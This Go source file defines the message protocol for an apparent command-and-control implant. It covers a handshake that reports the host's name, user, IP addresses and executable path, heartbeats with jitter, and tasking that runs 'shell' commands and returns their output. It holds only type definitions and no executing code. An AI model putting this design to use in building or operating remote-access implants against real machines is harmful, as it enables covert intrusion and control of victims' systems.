package protocol

import "encoding/gob"

func init() {
	// Register all message types with Gob so they can be serialized/deserialized.
	gob.Register(HandshakeRequest{})
	gob.Register(HandshakeResponse{})
	gob.Register(Heartbeat{})
	gob.Register(TaskRequest{})
	gob.Register(TaskResponse{})
	gob.Register(TaskDef{})
	gob.Register(TaskResult{})
	gob.Register(ProtocolError{})
}

// HandshakeRequest is sent by the implant on first connection.
type HandshakeRequest struct {
	AgentID  string   // UUID v4, generated once and persisted
	Hostname string
	OS       string   // "windows", "linux", "darwin"
	Arch     string   // "amd64", "386", "arm64"
	Username string
	PID      uint32
	LocalIPs []string // all non-loopback IPv4 addresses
	Version  string   // implant version "1.0.0"
	ExeDir   string   // directory containing the implant executable (landing dir)
	ExePath  string   // full path to the implant executable
}

// HandshakeResponse is sent by the server to accept/reject the handshake.
type HandshakeResponse struct {
	Accepted          bool
	AgentID           string // echo back the agent ID
	HeartbeatInterval uint32 // seconds
	JitterPercent     uint32 // 0-100
	ServerTime        int64  // Unix timestamp for clock sync
}

// Heartbeat is sent periodically by the implant. No response expected.
type Heartbeat struct {
	AgentID   string
	Timestamp int64 // Unix timestamp
}

// TaskRequest is sent by the implant to poll for pending tasks.
type TaskRequest struct {
	AgentID string
}

// TaskResponse contains the list of tasks the server wants the implant to execute.
type TaskResponse struct {
	Tasks []TaskDef
}

// TaskDef describes a single task for the implant.
type TaskDef struct {
	TaskID    string
	Command   string // "shell", "sleep", "exit"
	Arguments string // command string for shell, sleep duration, etc.
	Timeout   uint32 // seconds
}

// TaskResult is sent by the implant after executing a task.
type TaskResult struct {
	TaskID     string
	AgentID    string
	Status     string // "completed", "error"
	Output     []byte // raw output bytes
	ErrorMsg   string
	DurationMs uint32
}

// ProtocolError is sent on protocol-level errors.
type ProtocolError struct {
	Code    uint32
	Message string
}
